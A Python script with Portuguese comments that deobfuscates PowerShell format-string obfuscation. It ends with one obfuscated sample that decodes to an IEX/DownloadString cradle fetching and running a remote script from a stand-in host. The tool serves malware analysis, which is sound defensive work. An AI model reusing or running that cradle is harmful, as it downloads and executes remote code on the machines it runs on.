import re

def normalize_quotes(s: str) -> str:
    # Normaliza aspas tipográficas e remove caracteres invisíveis
    s = s.replace('“', '"').replace('”', '"').replace('‘', "'").replace('’', "'")
    s = s.replace('`', "'")
    s = re.sub(r'[\u200b-\u200f\uFEFF]', '', s)
    return s

# Regex para capturar: ("{...}" -f 'a','b',...)
format_pattern = re.compile(
    r'\(\s*("(?:(?:\\")|[^"])*"|\'(?:(?:\\\')|[^\'])*\')\s*-f\s*([^\)]+)\)',
    flags=re.IGNORECASE
)

def parse_args(args_text: str):
    # Extrai argumentos entre aspas simples ou duplas
    args = re.findall(r'(["\'])(.*?)\1', args_text)
    return [a[1] for a in args]

def apply_format(match):
    fmt_with_quotes = match.group(1)
    args_text = match.group(2)
    fmt = fmt_with_quotes[1:-1]
    args = parse_args(args_text)
    try:
        result = fmt.format(*args)
    except Exception:
        result = fmt_with_quotes
    return "'" + result + "'"

def deobfuscate_once(s: str) -> str:
    s_new = format_pattern.sub(lambda m: apply_format(m), s)
    # junta parênteses adjacentes: ')(' -> '' (concatenação comum)
    s_new = re.sub(r'\)\s*\(', '', s_new)
    # remove operador & usado para invocar scriptblocks no começo
    s_new = re.sub(r'&\s*', '', s_new)
    # simplifica chamadas de método .Invoke(...), .Start(...), .Execute(...) mantendo argumento
    s_new = re.sub(r'\.\s*(Invoke|Start|Execute)\s*\(\s*([^\)]+)\s*\)', r'\2', s_new, flags=re.IGNORECASE)
    s_new = re.sub(r'\s{2,}', ' ', s_new)
    return s_new

def deobfuscate(s: str, max_iters=20) -> str:
    s = normalize_quotes(s)
    previous = None
    for _ in range(max_iters):
        previous = s
        s = deobfuscate_once(s)
        if s == previous:
            break
    s = re.sub(r"'\s*'","'", s)
    if s.startswith("'") and s.endswith("'") and s.count("'") == 2:
        s = s[1:-1]
    return s.strip()

# Exemplo com a string que você enviou (normalizei aspas no exemplo):
obf = r"""&(" {1}{0}" -f 'EX','I')(&("{1}{0}{2}"-f 'Obje','New-','ct') ("{1}{4}{3}{0}{2}" -f'Clie','N','nt','t.Web','e')).("{1}{3}{0}{2}" -f 'trin','Downl','g','oadS').Invoke(("{1}{5}{2}{4}{3}{0}" -f 'l/cybad.ps1','h','ww','loca','w.demo.','ttp://'))"""

print(deobfuscate(obf))
